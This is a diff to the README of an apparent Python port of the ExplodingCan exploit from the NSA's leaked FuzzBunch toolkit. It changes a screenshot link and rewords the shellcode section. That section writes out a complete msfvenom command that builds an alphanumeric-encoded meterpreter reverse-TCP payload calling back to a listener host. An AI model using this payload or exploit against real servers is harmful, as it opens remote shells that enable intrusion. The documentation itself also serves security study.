@@ -2,7 +2,7 @@
 
 An implementation of ExplodingCan's exploit extracted from FuzzBunch, the "Metasploit" of the NSA.
 
-![exploit](https://user-images.githubusercontent.com/1675387/34538644-707d3dc8-f0cd-11e7-855f-24213f1ca579.png)
+![exploit](https://user-images.githubusercontent.com/1675387/34547090-d2c7309e-f0f8-11e7-83ca-02c1955432ad.png)
 
 ## Details
 
@@ -17,7 +17,9 @@ Months ago I needed to study this exploit, and finally I implemented it in pytho
 
 ## Shellcode
 
-The shellcode must be in alphanumeric format due to the limitations of the bug. e.g. with Metasploit using the `alpha_mixed` encoder:
+The shellcode must be in alphanumeric format due to the limitations of the bug.
+
+Example using msfvenom from metasploit with the `alpha_mixed` encoder.:
 
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=172.16.20.1 LPORT=4444 >shellcode
